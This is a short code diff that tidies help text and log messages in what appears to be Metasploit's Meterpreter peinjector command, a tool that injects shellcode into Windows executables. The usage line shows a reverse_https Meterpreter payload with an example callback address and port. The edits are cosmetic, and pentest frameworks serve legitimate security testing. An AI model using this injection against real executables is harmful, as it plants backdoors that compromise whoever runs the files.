@@ -35,16 +35,16 @@ class Console::CommandDispatcher::Peinjector
 
 
   @@injectpe_opts = Rex::Parser::Arguments.new(
-    '-p' => [true, 'Windows Payload to inject into the targer executable.'],
-    '-t' => [true, 'Path of the target executable to be injected'],
-    '-o' => [true, 'Comma separated list of additional options for payload if needed in \'opt1=val,opt2=val\' format.'],
+    '-p' => [true, 'Windows payload to inject into the target executable'],
+    '-t' => [true, 'Path of the target executable to inject'],
+    '-o' => [true, 'Comma separated list of additional options for the payload if needed in \'opt1=val,opt2=val\' format'],
     '-h' => [false, 'Help banner']
   )
 
   def injectpe_usage
     print_line('Usage: injectpe -p < windows/meterpreter/reverse_https > -t < c:\target_file.exe >, -o < lhost=192.168.1.123, lport=4443 >')
     print_line
-    print_line('Inject a shellcode on the target executable.')
+    print_line('Inject shellcode into the target executable.')
     print_line(@@injectpe_opts.usage)
   end
 
@@ -53,7 +53,7 @@ class Console::CommandDispatcher::Peinjector
   #
   def cmd_injectpe(*args)
     if args.length == 0 || args.include?('-h')
-	    injectpe_usage
+      injectpe_usage
       return false
     end
 
@@ -116,9 +116,9 @@ class Console::CommandDispatcher::Peinjector
       param[:targetpe] = targetpe
       param[:size] = threaded_shellcode.length;
 
-      print_status("Injecting #{pay.name} into the executable #{targetpe}")
+      print_status("Injecting #{pay.name} into the executable: #{targetpe}")
       client.peinjector.inject_shellcode(param)
-      print_good("Successfully injected payload into the executable: #{targetpe}")
+      print_good("Successfully injected the payload into the executable: #{targetpe}")
 
     rescue ::Exception => e
       print_error("Failed to Inject Payload to executable #{targetpe}!")
